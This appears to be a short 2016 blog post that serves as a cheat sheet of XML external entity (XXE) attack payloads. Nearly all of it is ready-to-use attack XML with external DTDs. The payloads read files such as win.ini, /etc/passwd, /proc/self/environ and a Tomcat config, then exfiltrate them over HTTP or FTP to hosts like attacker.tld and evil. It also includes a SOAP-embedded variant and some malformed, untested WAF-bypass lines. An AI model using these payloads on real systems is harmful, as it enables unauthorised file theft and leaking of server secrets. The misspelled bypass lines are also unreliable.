---
title: XXE_Payloads
date: 2016-03-30 13:55:27
tags: XXE
---

### Vanilla, used to verify outbound xxe or blind xxe


```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">
]>
<r>&sp;</r>
```
<!--more-->

### OoB extraction
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
```
> External dtd:

```
<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
```
<!--more-->
### OoB variation of above (seems to work better against .NET)
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
%sp;
%param1;
%exfil;
]>
```
> External dtd:

```
<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
```
### OoB extra nice
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml ">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://evil/evil.xml">
%dtd;
]>
<root>&all;</root>
 ```
> External dtd:

``` 
<!ENTITY all "%start;%stuff;%end;">
```
### File-not-found exception based extraction
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [  
  <!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" >
  %one;
  %two;
  %four;
]>
```
> External dtd:
```
<!ENTITY % three SYSTEM "file:///etc/passwd">
<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>"> //you might need to encode this % (depends on your target) as: &#x25;
```

### FTP
```
<?xml version="1.0" ?>
<!DOCTYPE a [ 
<!ENTITY % asd SYSTEM "http://x.x.x.x:4444/ext.dtd">
%asd;
%c;
]>
<a>&rrr;</a>
```
> External dtd:

```
<!ENTITY % d SYSTEM "file:///proc/self/environ">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
```
### Inside SOAP body
```
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
### Untested - WAF Bypass
```
<!DOCTYPE :. SYTEM "http://"
<!DOCTYPE :_-_: SYTEM "http://"
<!DOCTYPE {0xdfbf} SYSTEM "http://"
```
